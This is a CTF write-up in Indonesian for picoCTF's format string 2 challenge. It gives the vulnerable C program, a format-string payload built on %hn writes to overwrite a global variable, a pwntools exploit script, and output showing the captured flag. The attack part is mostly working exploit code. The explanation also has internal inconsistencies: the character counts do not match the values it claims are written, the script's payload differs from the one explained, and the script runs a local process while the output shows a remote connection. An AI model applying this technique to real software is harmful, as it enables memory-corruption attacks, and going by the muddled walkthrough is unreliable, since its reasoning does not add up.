# FORMAT STRING 2 WRITE UP

### Source code
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

Pada `printf(buff)` terlihat adanya keretanan format string, memanfaatkan kerentanan itu kita bisa menggunakan payload dibawah untuk mengubah nilai sus menjadi `0x67616c66`

### **Payload:**

```python
payload = b'%26464d,%20$hn%1281dAAAA%19$hnx,%40$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
```

Payload ini dibangun untuk menulis dua bagian dari nilai `0x67616c66` ke variabel `sus` yang terletak di dua alamat memori yang berurutan (`0x404060` dan `0x404062`).

### **Bagian-Bagian Payload:**

1. **`%26464d,%20$hn`**:
   - `%26464d`:
     - Ini mencetak `26464` karakter sebelum bagian berikutnya dari format string dievaluasi. Nilai ini dipilih karena kita ingin menulis nilai `0x6761` (dalam desimal `26465`) ke memori.
     - `d` digunakan untuk menghasilkan output string dengan panjang tertentu, yaitu 26464 karakter.
   - `%20$hn`:
     - `hn` menulis dua byte dari nilai karakter yang telah dicetak (`26464`) ke alamat memori yang ditentukan oleh argumen ke-20 dalam stack.
     - Alamat ini adalah `0x404060`, yang merupakan bagian pertama dari `sus`.

2. **`%1281dAAAA%19$hn`**:
   - `%1281d`:
     - Ini mencetak `1281` karakter tambahan, menjadikan total karakter yang dicetak menjadi `26464 + 1281 = 27745`.
     - Nilai ini dipilih karena kita ingin mencapai total `27750` karakter (sesuai dengan nilai `0x6c66` dalam desimal).
   - `AAAA`:
     - Ini adalah padding 4-byte untuk menjaga alignment dari data dalam stack.
   - `%19$hn`:
     - `hn` menulis dua byte dari nilai total karakter yang dicetak (`27745`) ke alamat memori yang ditentukan oleh argumen ke-19 dalam stack.
     - Alamat ini adalah `0x404062`, yang merupakan bagian kedua dari `sus`.

3. **`x,%40$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00`**:
   - `x`:
     - Mungkin ini adalah kesalahan atau tidak relevan untuk eksploitasi utama, tapi biasanya `x` tidak melakukan apa-apa.
   - `,%40$llx`:
     - Ini mencetak nilai dari alamat yang ditentukan dalam stack, tapi tidak relevan untuk eksploitasi ini.
   - `\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00`:
     - Ini adalah dua alamat memori dalam format little-endian.
     - `\x60\x40\x40\x00\x00\x00\x00\x00` adalah alamat pertama (`0x404060`).
     - `\x62\x40\x40\x00\x00\x00\x00\x00` adalah alamat kedua (`0x404062`).

### **Cara Kerja Payload:**

1. **Langkah Pertama**:
   - Payload mulai dengan mencetak 26464 karakter menggunakan `%26464d`.
   - Kemudian, `26464` dicetak, yang membuat posisi argumen stack ke-20 siap untuk diubah.
   - `%20$hn` menulis nilai `0x6761` (karakter `26464` ditambah `1` karena `hn` menulis 2 byte) ke alamat `0x404060`.

2. **Langkah Kedua**:
   - Kemudian, payload mencetak 1281 karakter tambahan menggunakan `%1281d`.
   - Sekarang, total karakter yang dicetak adalah `26464 + 1281 = 27745`.
   - `AAAA` digunakan sebagai padding agar menjaga alignment pada stack.
   - `%19$hn` kemudian menulis nilai `0x6c66` ke alamat `0x404062`.

3. **Hasil Akhir**:
   - Nilai `0x6761` ditulis ke alamat `0x404060`.
   - Nilai `0x6c66` ditulis ke alamat `0x404062`.
   - Jika payload bekerja dengan benar, variabel `sus` sekarang diubah dari `0x21737573` menjadi `0x67616c66` (yang dalam ASCII adalah 'gafl'), sehingga eksploitasi berhasil dan program akan mencetak flag.

### Exploit
```python
from pwn import *

io = process('./vuln')

payload = b'%26464d,%20$hn%1281dAAAA%19$hnp,%40$lls,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
# r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00DEFGHIJKLMNOPQRSTUVWXYZ')
io.sendline(payload)
io.interactive()
```

```bash=
python3 solve.py

[+] Opening connection to rhea.picoctf.net on port 63309: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:

I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}

[*] Got EOF while reading in interactive
```